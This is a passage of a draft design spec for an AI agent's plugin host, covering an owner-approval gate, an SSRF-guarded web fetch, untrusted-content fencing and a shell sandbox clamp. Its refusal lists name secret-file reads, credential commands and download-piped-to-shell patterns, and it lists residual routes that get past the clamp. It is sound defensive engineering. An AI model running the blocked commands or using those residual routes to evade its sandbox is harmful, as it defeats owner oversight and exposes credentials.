---
module: plugins
version: 58
status: draft
files:
  - plugins/discord/user-lookup.ts
  - tests/discord.user-lookup.test.ts
  - src/plugins/types.ts
  - src/plugins/registry.ts
  - src/plugins/run.ts
  - src/plugins/env.ts
  - src/plugins/mutating.ts
  - src/plugins/roles.ts
  - src/plugins/builtins.ts
  - src/plugins/must-ask.ts
  - src/plugins/githubDeny.ts
  - src/plugins/githubPublic.ts
  - tests/github.public.community.test.ts
  - tests/github.schedule-repo-gate.test.ts
  - tests/github.gate-allowlist-file.test.ts
  - tests/files.secret-path.test.ts
  - tests/search.secret-path.test.ts
  - src/audit/log.ts
  - src/audit/index.ts
  - tests/audit.log.test.ts
  - tests/store.busy-lock.test.ts
  - tests/audit.keyed-downgrade.test.ts
  - src/allowlist/types.ts
  - src/allowlist/load.ts
  - src/allowlist/github.ts
  - src/allowlist/discord.ts
  - src/allowlist/index.ts
  - tests/allowlist.toml-multiline.test.ts
  - tests/allowlist.tilde-path.test.ts
  - plugins/github/api.ts
  - plugins/github/commands.ts
  - plugins/github/ciStatus.ts
  - tests/github.ci-status.test.ts
  - plugins/github/index.ts
  - plugins/github/review.ts
  - tests/github.review.plugin.test.ts
  - plugins/github/public-docs.ts
  - tests/github.public-docs.test.ts
  - plugins/meta/index.ts
  - plugins/specsync/api.ts
  - plugins/specsync/commands.ts
  - plugins/specsync/index.ts
  - tests/specsync.path-containment.test.ts
  - tests/specsync.check-parity.test.ts
  - tests/specsync.registry-fallback.test.ts
  - plugins/memory/index.ts
  - plugins/memory/commands.ts
  - plugins/files/index.ts
  - plugins/files/commands.ts
  - plugins/files/protectedPaths.ts
  - plugins/files/resolvePath.ts
  - plugins/files/argv.ts
  - plugins/files/image.ts
  - plugins/search/index.ts
  - plugins/search/commands.ts
  - src/memory/confirm.ts
  - tests/memory.plugins.test.ts
  - tests/memory.profiles.test.ts
  - tests/memory.recall-github.test.ts
  - tests/memory.confirm.test.ts
  - tests/files.plugins.test.ts
  - tests/files.dangling-symlink.test.ts
  - tests/search.plugins.test.ts
  - tests/plugins.argv-dashes.test.ts
  - plugins/shell/index.ts
  - plugins/shell/commands.ts
  - plugins/shell/clamp.ts
  - tests/shell.plugins.test.ts
  - tests/shell.clamp-bypass.test.ts
  - tests/shell.clamp-failclosed.test.ts
  - tests/shell.clamp-quoting.test.ts
  - plugins/runners/index.ts
  - plugins/runners/commands.ts
  - tests/runners.plugins.test.ts
  - tests/shell.clamp-scripts.test.ts
  - plugins/shell/footguns.ts
  - plugins/shell/must-ask.ts
  - tests/shell.footguns.test.ts
  - plugins/web/index.ts
  - plugins/web/commands.ts
  - plugins/web/fetch.ts
  - plugins/web/address.ts
  - plugins/web/transport.ts
  - plugins/web/text.ts
  - tests/web.fetch.test.ts
  - tests/web.transport.test.ts
  - plugins/git/index.ts
  - plugins/git/commands.ts
  - plugins/git/exec.ts
  - plugins/git/parse.ts
  - tests/git.plugins.test.ts
  - plugins/autonomous/index.ts
  - plugins/autonomous/commands.ts
  - plugins/autonomous/council.ts
  - tests/autonomous.delegate.test.ts
  - tests/autonomous.council.test.ts
  - plugins/fledge/index.ts
  - plugins/fledge/discover.ts
  - plugins/fledge/commands.ts
  - plugins/fledge/spawn.ts
  - plugins/fledge/core.ts
  - plugins/fledge/must-ask.ts
  - src/plugins/toolCost.ts
  - tests/fledge.plugins.test.ts
  - tests/fledge.cli.test.ts
  - tests/fledge.hardening.test.ts
  - tests/fledge.core.test.ts
  - src/plugins/proc-group.ts
  - tests/proc-group.test.ts
  - tests/roles.chat.gates.test.ts
  - tests/roles.team.test.ts
  - tests/must-ask.gate.test.ts
  - tests/must-ask.classify.test.ts
  - tests/must-ask.boundary.test.ts
  - tests/must-ask.regression.test.ts
  - tests/fixtures/must-ask.ts

db_tables: []
depends_on: []
---

# Plugins

## Purpose

Plugin host includes Discord outbound post, GitHub write plugins as dangerous
(GITHUB-2/3/5), memory-store/recall/forget/override (MEMORY / REQ-plugins-010),
file/search plugins with SAFE-2 guards (PLUGIN-1/2 / REQ-plugins-081..084),
`shell-exec` with SAFE-3 project-root cwd clamp (REQ-plugins-086..088) and
SAFE-21 foot-gun refusals, starting without GitHub or git credentials
(SAFE-21 / SAFE-21.a / REQ-plugins-494..495),
language runners `node-exec` / `python-exec` / `cargo-exec` that register only
when their toolchain is on PATH (PLUGIN-4 / REQ-plugins-313..314), the
SSRF-guarded `web-fetch` GET plugin (PLUGIN-1/2 / SAFE-7 / REQ-plugins-111), and
typed git plugins (`git-status|diff|log|branch-list` reads;
`git-branch-create|commit|push` dangerous code-tier mutators) clamped to the
task worktree (PLUGIN-1/2, SAFE-1/2/3, GITHUB-2/6 / REQ-plugins-182), and
Fledge itself as typed builtins (`fledge-lanes-list|lanes-validate` reads;
`fledge-lanes-run` / `fledge-run` dangerous code-tier runs of the project's
own lanes and tasks; PLUGIN-1/2 / REQ-plugins-461), next to the bridge that
offers the project's Fledge plugins as `fledge-<command>` (PLUGIN-3 /
REQ-plugins-112..113).
Autonomous extras are plugins left off until the project opts in (PLUGIN-5):
`delegate` hands a subtask to a worker agent (AUTONOMOUS-5 / REQ-plugins-117);
`council` convenes worker voices that propose, critique and decide
(AUTONOMOUS-6 / REQ-plugins-118). Both pass a worker's own SAFE-13 hit
(`result.injection`, validated) back as `data.injection`, which the lead's
tool loop takes as its own hit (REQ-plugins-071), and a worker's model
failovers (`result.modelFallback`, validated; a council's voices' each once)
back as `data.modelFallback`, which the lead reports as its own run's
(AGENT-11, REQ-plugins-080).
Every call goes through the must-ask gate in `runPlugin`: a call its command
classes as prod or deploy contact or as a channel post waits for the owner's
Approve card, and anything else runs with no ask (AUTONOMY-9/10/11,
REQ-plugins-097).

## Public API

Export allowlist load + github/discord gate helpers used by plugins and future
HEAR. `resolveAllowlistPath(env, home)` returns `CORVIDINHO_ALLOWLIST_FILE`
with a leading `~` or `~/` read as `home` (`~user` and every other value as
written), else the first default path that exists; the loader, owner loader,
`/admin` writer and doctor all resolve the file through it. File/search
plugins register via `loadFilesPlugins` / `loadSearchPlugins`.
HEAR. `isChannelDenied` (`src/allowlist/discord.ts`) reports a `deny_channels`
hit alone (case-insensitive, trimmed, as `checkChannel` uses it) so a thread
gate can make a deny on the thread or its parent win (REQ-plugins-005). File/search plugins register via `loadFilesPlugins` / `loadSearchPlugins`.
Shell plugins register via `loadShellPlugins` (`shell-exec`);
`plugins/shell/index.ts` also exports the clamp (`firstDisallowedCd`,
`isCdEscape`, `forEachSimpleCommand`, `clampRefuseMessage`) and the SAFE-21
check (`firstFootgun`, `footgunRefuseMessage`). Language
runners register via `loadRunnerPlugins(env?)` (`plugins/runners/index.ts`),
which returns a `RunnerLoadReport` (`loaded` with each bound binary, `missing`
with a reason) that `runnerStatusLines` renders for `plugins list`;
`resolveRunnerBin`, `RUNNERS`, `runnerCommand(spec, bin)`, `runRunner`,
`runnerChildEnv`, `withoutGitCredentials` and `isCredentialEnvKey` are
exported for tests. Git plugins
register via `loadGitPlugins` (`plugins/git/index.ts`).
`plugins/web` registers `web-fetch` via `loadWebPlugins`; `createWebCommands`
takes the resolver/transport seams (and optional `env` / `allowlist`, the
schedule-run GitHub gate's seams), `webFetch` is the guarded GET core,
`githubRepoOfUrl(url)` says whether a URL is on a GitHub host and which
`OWNER/REPO` it names (DISCORD-SCHEDULE-3.a),
`checkAddress` classifies one IP, and `createSocketTransport` is the pinned
HTTP/1.1 socket transport. Autonomous plugins
register via `loadAutonomousPlugins` (`plugins/autonomous/index.ts`);
`createDelegateCommand(deps)` builds `delegate` with an injectable env, bin,
limiter and timeout; `createCouncilCommand(deps)` builds `council` with an
injectable env, bin, limiter, council timeout and per-voice timeout.
`PluginCommand.autonomous?: boolean`; `PluginCommand.agentTool?: boolean`
(false: never in the agent's tool catalog, the agent loop runs it itself;
AGENT-18.a). `plugins/specsync/commands.ts` exports `SDD_OFF_REFUSAL`;
`specsyncCommands` gains `specsync-change-status`, `specsync-change-new`,
`specsync-change-answer`, `specsync-change-approve` and
`specsync-change-finalize` (REQ-plugins-518 / REQ-plugins-519);
`TEAM_WORK_TOOLS` gains the last four;
`PluginHandlerArgs.tier?` / `signal?` and matching `runPlugin` options.
`src/plugins/proc-group.ts` (REQ-plugins-154) exports `killProcessTree`,
`signalProcessTree`, `collectProcessTree`, `readProcTable`, `parseProcStat`,
`trackChildProcess(pid, known?)` (the `KnownMembers` exit-snapshot getter),
`trackedChildProcesses`, `ignoredSignals` (`SigIgn` mask parse) and
`forwardedSignals` (hooked signals, minus those ignored at load) for children
spawned with `detached: true`. The registry exports `unregister(name, command)` (removes a
name only while it is still that exact command). `plugins/fledge` exports
`fledgeRunArgv` and `fledgeBindings`; `fledgePluginCommand` takes the project
root it binds to, and `runFledgeCommand` / `spawnCapped` take `signal`.
`plugins/fledge/core.ts` (re-exported from `plugins/fledge/index.ts`) registers
the Fledge core builtins via `loadFledgeCorePlugins(opts?)` (called by
`loadBuiltins`; a name already registered is left as is) and exports
`fledgeCoreCommands(opts?)` (test seams: `env`, `readTimeoutMs`,
`runTimeoutMs`, `maxOutputBytes`), `FLEDGE_CORE_COMMAND_NAMES`,
`FLEDGE_NAME_RE`, `resolveFledgeBin(env)`, `fledgeCoreChildEnv(base, root)`,
`laneSourcesRefusal(cwd)`, `parseLanesList` and `parseLanesValidate`.
Must-ask (REQ-plugins-097): `PluginCommand.mustAsk?` is a `MustAskClass`
(`prod` | `public`) or a `MustAskClassifier` (`{ args, cwd, env }` →
`MustAskVerdict`: null, `{ ask: MustAskAsk }` with `class`, `why`, `target`
and optional exact `text`, or `{ refuse: PluginHandlerResult }`);
`src/plugins/must-ask.ts` exports `mustAskGate(input)` (null ⇒ run; a result
⇒ return it and run nothing), `mustAskVerdict(cmd, args, cwd, env?)`,
`MUST_ASK_POLICY` (spend / prod / public → AUTONOMY-8 / -9 / -10 and the card
kind and class), `MUST_ASK_PROD_KIND` (`mustask`), `MUST_ASK_POST_KIND`
(`mustask-post`), `MUST_ASK_CARD_KINDS`, `MUST_ASK_CARD_TTL_MS` (5 min),
`MUST_ASK_POLL_MS`, `MUST_ASK_NOTHING_DONE`, `MUST_ASK_WHY_MAX` (300: the
card's action and target lines are kept to one short line; the exact text or
command goes out whole before the card), `PROD_COMMANDS`,
`prodCommandWhy(name, args)`, `prodTextWhy(text)`,
`setMustAskNotifier(fn | null)` and the test seam `setMustAskTestHooks`
(`MustAskTestHooks`: `ttlMs`, `pollMs`, `onRequest`).
`plugins/shell/must-ask.ts` exports `shellProdWhy(command, root, opts?)`,
`taskCommandProdWhy`, `runnerProdWhy(tool, args, root, opts?)`,
`isSelfUpdateToTag(command, root, opts?)`, `INSTALL_ROOT` and
`SELF_UPDATE_SCRIPT`; `plugins/fledge/must-ask.ts` exports
`fledgeRunMustAsk`, `fledgeLanesRunMustAsk` and `fledgePluginMustAsk(command)`.
`plugins/specsync/api.ts` exports `listRegisteredModules` (in a project that
has a `.specsync/` dir, each `specs/<name>/<name>.spec.md` that
`readModuleSpec` reads, plus the `[specs]` names of `.specsync/registry.toml`
when that file exists; sorted, each once), `MODULE_NAME_RE` / `invalidModuleName` (the
plain module-name check), `refuseRootArg`, `readModuleSpec` (its error carries
`refused: true` for an invalid name or an escaping path), `readCompanions`
(returns `error` and no files when it refuses), `projectDefinesSpecCheckTask`
(the project `fledge.toml` defines a `spec-check` task; true when that file
cannot be read or parsed) and `runSpecCheck` (the Fledge `spec-check` task
when fledge is on PATH and the project defines it, else local `specsync
check`).

## Invariants

Builtin plugin loaders MAY re-register after an in-process registry clear
(test seam). Presence of an already-registered command name skips duplicate
register. GitHub write commands (`github-issue-create`, `github-issue-comment`,
`github-pr-create`, `github-pr-review`) are dangerous + minTier 1; SAFE-1
non-interactive deny unless CORVIDINHO_ALLOWLIST names them. Repo gate
(GITHUB-6 / ALLOW-1) still applies before any Octokit write. PR create appends
plain Made with Corvidinho attribution (no @handles) unless the body already
holds it (`ATTRIBUTION_MARKDOWN` or `ATTRIBUTION_PLAIN`; the two words alone
do not count). The Octokit token is `GITHUB_TOKEN`, else `GH_TOKEN`, trimmed;
a blank one is missing and never shadows the other, as WATCH reads it. Dry-run via
CORVIDINHO_GITHUB_DRY_RUN=1. File write/edit/delete require minTier 2 (code);
`files-delete` is dangerous. Paths clamp to plugin cwd; symlink escapes refuse;
a dangling symlink is followed by hand and its target clamped (loops refuse).
Protected infra (`.env*`, `.git`, `fledge.toml`, `.fledge/**` (lane imports
the verify gate runs, SAFE-2.a), `bunfig.toml`,
`specs/**` / `*.spec.md`, `.specsync/` state outside the files of an active
`.specsync/changes/<id>/` folder, and any keystore file or directory inside
the project; a change folder's slug name is not a keystore) cannot be
overwritten or deleted via file tools (SAFE-2); no in-band override. Memory plugins take the acting user and ADMIN
only from bridge-set env (`CORVIDINHO_ACTING_DISCORD_USER_ID` /
`CORVIDINHO_ACTING_IS_ADMIN`), never argv — `--user` / `--admin` / `--db` are
refused; ADMIN is re-checked in the handler (empty admin lists ⇒ nobody);
`memory-forget` / `memory-override` are two-phase with an HMAC confirm token
confirmed from a different turn (SAFE-4 / REQ-plugins-011).
Whose memory a call reads and writes is the acting Discord id matched in the
owner's people list re-read at the call (MEMORY-5 / REQ-plugins-101): a
declared person's one `person:<id>` profile (plus rows under their Discord
ids from before), else the Discord id as before; profile categories
`project` / `preference` / `decision` / `ask` / `approval` and private notes
(`private`); `memory-profile` shows role (the people list's), projects,
preferences and history, private notes counted only. `--person` reads
someone else's memory for the owner only, opaque `not authorized` otherwise;
private notes come back only when asked for by name, by that person or the
owner, in a conversation (MEMORY-7). `--project` is the run's repo memory
(`project:<owner/repo>` or the main checkout path) for owner, team and the
local CLI, never community (MEMORY-6). `memory-forget-me` (safe, no argv)
records the acting person's forget request from a conversation, audited;
it deletes nothing (MEMORY-ACL-6).
In a GitHub WATCH run (no Discord actor) the acting person is the commenter
the poller sets (`CORVIDINHO_ACTING_GITHUB_LOGIN` / `_ID`, thread repo
`_REPO`; env only) matched by the GitHub numeric id only in the people list
(never the login, IDENTITY-7.a; MEMORY-8 / REQ-plugins-067): a declared commenter stores and recalls their own
profile; an undeclared one gets community scope — `memory-recall --project`
reads the thread repo's project memory, nothing is saved; from GitHub project
memory is never written and `--person`, private notes and `memory-forget-me`
are refused — `memory-forget-me` names the path that works there instead: a
comment that @mentions the watch user and says just "forget me", which the
WATCH poller records for the owner's card (MEMORY-ACL-6.a / REQ-plugins-1016).
`memory-recall --query` is ranked by relevance, then recency
(MEMORY-9).
Private reads are shown only privately (MEMORY-7.a / REQ-plugins-710): in a
Discord conversation (a role session with the bridge's reply channel set) the
text of `memory-recall --category private`, of the owner's `--person` view and
of `memory-profile` (own or `--person`) comes back only in the result's
`privateText`; `data` (`{ sentPrivately: true, what }`) and `message` (the
`SENT_PRIVATELY_MESSAGE` placeholder) — all the tool loop gives the model —
never hold it. Where there is no private place to show it (a schedule or other
run with no conversation, a GitHub thread) those reads are refused, including
`memory-profile` on GitHub; the local CLI (no role session) shows them on the
operator's terminal as before.
Memory plugin command descriptions SHALL include concrete argv examples so the
LLM tool loop can call them (REQ-plugins-085). OpenAI tool schema argv text for
`memory-*` is enriched similarly in `buildOpenAiTools`.
`web-fetch` is dangerous + minTier 1 (tool): SAFE-1 consent applies (left out
of the default tool catalog, non-interactive deny unless CORVIDINHO_ALLOWLIST
names it, SAFE-5 audit) until community-role web gating (#65) and the
untrusted-content rules (#71) are captured. GET only, http/https only, no URL
credentials, and no URL (first hop or redirect) carrying a value
`scrubSecrets` would redact, raw or percent-decoded, so vendor-key-shaped
values never leave in a URL. Loopback, private, CGNAT, link-local (incl. cloud
metadata), unique-local, multicast, unspecified, `0.0.0.0/8`,
reserved/documentation and IPv4-mapped / NAT64 forms of those are refused after
DNS and before any connection; any non-public address in an answer refuses the
whole name. The socket dials only checked IP literals (no DNS, no proxy), in
answer order, trying the next checked address only after a socket-level
connect error, while Host and TLS SNI keep the original name and the
certificate is verified against it. Redirects are followed manually (max 5)
and every hop repeats the check. The body is capped at 1 MiB and the returned
text at 100,000 chars (truncated, flagged with `truncatedBy`), the whole call
at 15 s; non-text or malformed (not an RFC 6838 `type/subtype` token) content
types and compressed bodies are refused. Returned text has C0/C1 controls
stripped (newline and tab kept), is secret-scrubbed and is fenced as untrusted
data with a per-call random marker id; the page title is a `Title:` line
inside the fence, never a separate field. The fence is the shared
`fenceUntrustedData` (`src/agent/untrusted.ts`, SAFE-12, REQ-plugins-071)
with the `UNTRUSTED_WEB_CONTENT` word: bidi, zero-width, BOM, soft hyphen and
tag characters are stripped too, and a page line that imitates a Corvidinho
context block (`[Corvidinho …`, `[untrusted …`, the replay footer) is marked
`(quoted)`.
`discord-user-lookup` cleans every member name it returns (username, global
name, nickname, display name) with `cleanDisplayName` before it reaches the
model (SAFE-11, REQ-plugins-071); a lookup never makes anyone a declared
person or gives a role. What a plugin may run is decided only by the acting
role resolved in the tool layer (`resolveActingRole`, REQ-plugins-065): text
in a task, a body or a tool result that claims the owner's identity widens
nothing (SAFE-12, REQ-plugins-071). Errors never echo the reason phrase
or other server-chosen header values and are one line, control-free and at
most 300 chars. `web-search` is not built (provider not captured).
Git plugins (REQ-plugins-182) spawn `git` with argv arrays only (no shell),
stdin closed, `GIT_TERMINAL_PROMPT=0`, hooks disabled, repo-locating env
stripped and `GIT_CEILING_DIRECTORIES` at the cwd's parent; the plugin cwd
must be the repository / worktree top level (SAFE-3). Flags are strict
(unknown refused); path args use the files-plugin clamp and go after `--` as
literal pathspecs. Hooks stay off even with a repo-local `core.hooksPath`, and
a linked worktree top level (`.git` file) is a valid cwd. `git-status` lists
untracked files individually (`--untracked-files=all`) so they feed
`git-commit`. `git-branch-create` switches with `--no-overwrite-ignore` so an
ignored `.env*` / keystore is never replaced by a start point's tracked copy
(SAFE-2). Reads are `dangerous: false`, minTier 0. `git-branch-create`,
`git-commit` and `git-push` are dangerous + minTier 2. `git-commit` needs a
message, stages explicit file paths only (no directories / `--all` / amend),
commits only those paths (`--only`), refuses `.env*` / keystore (any
component, files in a keystore dir too) / `.git` paths and staging the
deletion of SAFE-2 protected infra, and reports
`filesChanged`. `git-push` pushes only the current branch to the same-named
ref of a configured remote (never a URL), never forces, gates every push
URL's OWNER/REPO through `checkRepoGate` with the allowlist file + env
(GITHUB-6, deny wins), and redacts URL credentials / secret tokens. Draft
SAFE-22 default-branch policy is not enforced (awaiting HI); a push of the
remote's default branch waits for the owner's card as a deploy (AUTONOMY-9,
REQ-plugins-097).

Must-ask (AUTONOMY-9/9.a, AUTONOMY-10/10.a channel posts, AUTONOMY-11,
REQ-plugins-097): `runPlugin` calls `mustAskGate` after the role gate and the
SAFE-1 deny and before the SAFE-5 `started` row, for every caller (the tool
loop on every surface, `/work`, schedules, WATCH, `plugins run`). The class
comes from the command's own `mustAsk` only; a classifier that throws asks as
prod (fail closed). A `refuse` verdict is returned as the command's own
refusal with no card. For an `ask`: a delegate or council worker
(`CORVIDINHO_DELEGATE_DEPTH` > 0) is refused with no card; with no owner
configured the call is refused at once; the same call the owner denied
(same kind and action hash — tool, args and target — and the same requester)
is refused with no new card; otherwise one `approval_requests` row is
recorded (kind `mustask`, class destructive, for prod — Approve plus the
SAFE-19 one-time code, AUTONOMY-9.a; kind `mustask-post`, class plain, for a
channel post), with the exact text or command as its text, the acting user as
requester, this process as waiter and a 5-minute expiry; the run notes the
wait once (`setMustAskNotifier`, stderr by default) and polls the decision
with the run's abort signal. Only an approval it consumes once runs the call;
a deny, no answer by the expiry or a stopped run (exit 130) runs nothing and
returns a refusal naming the rule, the request id and why (SAFE-20); every
refusal appends a `denied` SAFE-5 row. Classified builtins:
`discord-post-message` (public: every post, the exact defanged text shown; a
dry run asks nothing; a post its own checks refuse is refused before any
card), `shell-exec`, the runners, `fledge-run`, `fledge-lanes-run`,
discovered `fledge-<command>` and `git-push` (prod); every other builtin has
no class. `shell-exec` (`shellProdWhy`) reads each simple command over the
clamp's walker and each command an exec wrapper runs: a `PROD_COMMANDS` name
(ssh family, root, the box's services, packages, containers, firewall and
cron, secrets tools, cloud, hosting, cluster and infrastructure CLIs, DNS
tools), remote `rsync`, `gh` on secrets / variables / workflows / releases
(and `gh api` on those paths), `git push` (the git and gh subcommand read
past global options and their values, `git -C . push`; a git alias read from
the repo's config like the command it stands for, one set with `-c alias.…`
asks), `npx` / `bunx` / `bun x` / `pnpm dlx` / `yarn dlx` / `npm exec` of
one (`-c` shell text read as a command), a package script (with its
pre/post) from the project's package.json (`bun <script>` included; `bun
<file>` and `bun exec` text read too; an install reads the project's install
lifecycle scripts), a `make` / `just` recipe with its prerequisites and
variables, inline interpreter code and an in-root or `#!` script an
interpreter or a path runs; an unreadable script or recipe, a make / just
file or dir option, a package-manager option that picks another package.json,
workspace, preload or shell, and a command named by an expansion ask; the
box updater by any other path or form asks. A command SAFE-21 or the clamp refuses is not
classified. `isSelfUpdateToTag`: exactly `CORVIDINHO_REF=v<X.Y.Z>` and the
installed checkout's `scripts/corvidinho-update.sh` (or `bash` it), nothing
else typed, and a tag that checkout has, is not a deploy (AUTONOMY-9). The
runners (`runnerProdWhy`) ask on table words in argv and in an in-root script
they are handed; `fledge-run` / `fledge-lanes-run` read the task and lane
commands from `fledge.toml` and `.fledge/lanes/*.toml` (tasks with `deps`,
steps as task names, `{ run }`, `{ task }` and `{ parallel }`) like shell commands, and
ask for anything they can't read (no fledge.toml: fledge refuses, no ask);
a discovered `fledge-<command>` asks on table words in its name or argv.
`git-push` asks when the current branch is the remote's recorded default
(`refs/remotes/<remote>/HEAD`) or a usual default or deploy name (`main`,
`master`, `trunk`, `production`, `gh-pages` …) whatever default is recorded;
feature branches never ask. The gate's notes and refusals are secret-scrubbed
(SAFE-6), and a run stopped just as the owner approves runs nothing (the
approval is left unused).

`delegate` (REQ-plugins-117) is `dangerous: false`, `mutating: true`, minTier
2, `autonomous: true`: hidden from the tool catalog unless the session is
allowed (SAFE-9), never offered to or run for a non-ADMIN role session
(ROLES-CHAT-2/3/5, a worker runs tools), and its handler re-checks at run
time, in order, usage (exit 1), the
AUTONOMOUS-1 project switch, the depth cap, a code-tier lead, and the
concurrency / per-run budget (exit 2, nothing spawned). It returns the
worker's skill, tier, depth, state, summary and filesChanged.

Fledge commands (REQ-plugins-112/113) run `fledge plugins run <command> --
<argv...>`, are bound to the project root they were discovered for (another
root's load rebinds or removes them; a call from another cwd is refused), and
run in their own process group so a timeout or abort stops the whole tree.
Bounded children (Fledge runs, delegate workers, spawned schedule/chat runs)
never outlive their limit or this process (REQ-plugins-154).

`council` (REQ-plugins-118) declares the same flags as `delegate`
(`dangerous: false`, `mutating: true`, minTier 2, `autonomous: true`) and
re-checks the same gates in the same order (usage exit 1; AUTONOMOUS-1,
top-level lead only (depth 0: a delegated worker is refused), code-tier lead,
council budget exit 2, nothing spawned). One council runs
at a time and at most 2 per lead run. Its voices are delegate-core workers at
read tier by default (tool at most), non-ADMIN, with an empty allowlist. It
returns the voice count, tier, depth, state, decision, phase tallies and a
bounded transcript; ok only when the chair decided.

`shell-exec` is dangerous + minTier 2 (code). Spawn cwd is pinned to plugin cwd.
Lexical `cd`/`pushd` targets that escape the root are refused before spawn
(SAFE-3) with exit 2, and the clamp fails closed on anything it cannot resolve
to an in-root target. It tokenizes the way the shell reads a command: quoted
and backslash-escaped text joins into one word (quoted separators are not
separators; quotes and backslashes are removed before checking), a
`\`-newline outside single quotes is a continuation (an escaped `\` before a
newline is not), `#` at a word start comments to the end of the line, and a
`$(…)` ends where those same rules say. A command with `<<` is checked both as
dash reads it (the here-doc body is data; only an unquoted one's `$(…)` /
backticks are analysed) and as bash may read it (`(( x << 2 ))` is arithmetic,
so the lines after it are commands), and refuses if either does; a command
with `$'` is also checked with `$'…'` read as bash's ANSI-C quoting (a
backslash escape in it counts as an expansion). Each `eval` argument and `trap` action, and the
`-c` string of a shell (`sh bash dash zsh ksh mksh ash yash posh`, by name or
path, anywhere in the command: behind `env`, `timeout`, `xargs`, `find -exec`
…; `-` ends its options like `--`, and `o` in a cluster such as `-co pipefail`
takes the next word), is checked the same way as a command. So is each script
the command runs in a shell, read from the root and every in-root `cd` target
before it: a file sourced with `.` / `source`, named by `BASH_ENV=` or a
shell's `--rcfile` / `--init-file`; a file a shell runs as its operand or reads
through `<` / `<>`; a here-doc (an unquoted body as the shell expands it) or
here-string a shell reads; and a file run by path (a command word holding `/`,
also behind the wrappers above) whose `#!` names a shell or that has no `#!`
and is text. An offending target names the script (`/etc (in ./x.sh)`). A
script that cannot be checked refuses: a path that would expand, a sourced or
shell-run file that does not exist, more than 1 MiB of script text or more than
32 scripts or directories to place them in, a script the command writes (an
output redirection target or an argument of a command that is not read-only,
whatever the order), shell input that would expand, and a shell reading
commands from anything else (a pipe, its inherited standard input, a process
substitution). A file run by path that does not exist yet (a program the
command builds) or is not a shell script (a binary, a `#!` for another
interpreter) is not read. Alias definitions refuse. A `cd` / `pushd` left open by an unterminated quote or a
trailing `\` refuses, as does a command nested too deeply to check. It looks past prefix words (`{ } ! if
then else elif do while until time builtin command`, `function NAME`) and
`NAME=value` / `NAME+=value` assignments, drops redirections (with their
targets and any `fd` prefix such as `2>&1`, never splitting on a redirection
`&`) and skips `cd` options (`-P -L -e -@ -n --`). It refuses `cd -`, a target
the shell would expand (`$`, backtick, glob, brace), a command word that would
expand, an `eval` or shell `-c` string that would expand, escaping `cd` inside a command
substitution (`$(…)` / backticks), and `DIRSTACK` writes. CDPATH is not refused
lexically: the child shell runs `CDPATH=; readonly CDPATH` and does not inherit
`CDPATH` or `OLDPWD`, so a `CDPATH` set (even dynamically) in the command cannot
redirect a relative `cd`. SAFE-1 non-interactive deny applies unless allowlisted.
The clamp also checks `env -C` / `--chdir` (clustered `-iC`, abbreviated
`--ch`) and `sudo -D` / `-R` directories like a `cd` target, refuses a wrapper
string it cannot read (`env -S`, `sudo -s` with a command), reads `sudo` and
`doas` as exec wrappers, follows symlinks that exist when it places a `cd` /
`pushd` / `env -C` target (a link that points out of the real root, or cannot
be walked, refuses), and refuses an `ln` whose target leads out of the root
(REQ-plugins-495). The clamp is lexical, so some routes stay out of its reach
and are residual risk rather than refusals: a directory change made by
another interpreter (`python3 -c`, `node -e`, `perl -e`, a `#!` script for
one) or by a tool that runs its own shell strings (`make`, `npm run`,
`watch`, `flock -c`, `su -c`, `ssh`) or takes its own directory option
(`make -C`, `git -C`, `tar -C`); a symlink made by something other than `ln`
(`cp -s`, `tar x`, `git checkout` of a tree holding one, an interpreter) and
then `cd`'d through in the same command (one that exists before the command
is followed); a script written by a command that does not name it (`tar x`,
`unzip`, `git checkout`, `cp -r`, a generator) or changed after the check;
and a script found through a `PATH` or `hash -p` the command changes. Scripts
that `cd` through a variable (`cd "$(dirname "$0")"`, `cd "$SCRIPT_DIR"`)
refuse like the same `cd` typed directly.

SAFE-21 (REQ-plugins-494): before the clamp, `firstFootgun`
(`plugins/shell/footguns.ts`) reads every simple command over the clamp's
ground with one walker (`forEachSimpleCommand`: dash and bash readings,
`eval` / `trap` / `-c` strings, command substitutions, the here-docs a shell
reads, and the in-root scripts the command runs), each with the commands
piped into it and the dirs the shell may be in, and refuses (exit 2,
`shell-exec refused (SAFE-21): <why>; <what to do instead>`, `data.rule`
`SAFE-21`, `data.family`, `data.script`) the first foot-gun, most serious
family first: a download run as code (a downloader piped into a shell,
interpreter or `.` reading standard input, also through `env` / `timeout` /
`sudo` / `doas` / `xargs`; a shell, interpreter, `eval` or `.` fed an
expanded string, `<(…)` or an expanded here-doc while the command downloads;
a script the command's downloader names); a delete outside the worktree
(`rm`, `rmdir`, `unlink`, `shred`, `mv`, `find -delete` / `-exec rm`,
`xargs rm`, `ln -f`, `git worktree remove|move|prune`, git's deleting
subcommands under an outside `-C` / `--work-tree`; outside as written or
through a symlink, or the worktree's own dir; expanded, `~`, `..`-glob,
dot-matching or link-following-glob targets fail closed); a secret read
(`isSecretPath`, unchanged; `/proc/<pid>/environ`; paths after `:` / `=`;
the host's secret places — the Corvidinho env and allowlist files, the
`corvidinho`, `gh` and `git` config dirs, `GH_CONFIG_DIR`,
`~/.git-credentials`, `~/.gitconfig`, `~/.netrc`, `~/.ssh` — as written,
expanded and through symlinks, and a path holding one for a tree reader or a
glob; credential env vars read or re-pointed; `gh auth token` and friends;
`git credential*`; `git -c` / `git config` of credential, include or URL
keys; the ssh family); and, in the typed text only, an edit (`sed -i` /
`--in-place`, and output redirections other than `/dev/null`, stdout, stderr
and fd dups). The download, delete and secret families also read the in-root
scripts, so a script written with files-write and run with `sh x.sh` does
not get past them. A shell fed a download is refused whatever its `-c`
runs, a downloaded file run by path is refused, `find -L` / `-follow`
deletes and `rsync --delete` outside are refused, a glob that matches a
secret file now (`cat .en*`) is refused, wrappers that start their command
with an env of their own (`env -i`, `exec -c`, `sudo`, `doas`, `su`,
`runuser`, `pkexec`) and `ps e` are refused as secret reads, and `tee` /
`sponge` to a file and `perl -i` / `ruby -i` / `awk -i inplace` are refused
as edits. SAFE-21 residuals: a script's own redirections (the edit
family reads the typed text only); writers that are not an edit idiom
(`cp`, `dd of=`, `install`, an interpreter); code a program fetches
itself (`python3 -c 'urllib…'`, `npx`, `deno run URL`) or a download saved
under a name the command does not show and run later; deletes and secret
reads done by another interpreter, a tool's own strings (`make`, `npm run`)
or a recursive reader inside the worktree (`grep -r` reads an in-root
`.env`); a delete target changed between the check and the run (a symlink
swapped in); and `[[ a > b ]]` / `(( a > b ))`, read as redirections and
refused.

SAFE-21.a (REQ-plugins-495): the child env is the runners' env
(`runnerChildEnv`): the verify lane's scrub, no `CDPATH` / `OLDPWD`, and no
GitHub or git credentials — credential keys dropped, git reading no global
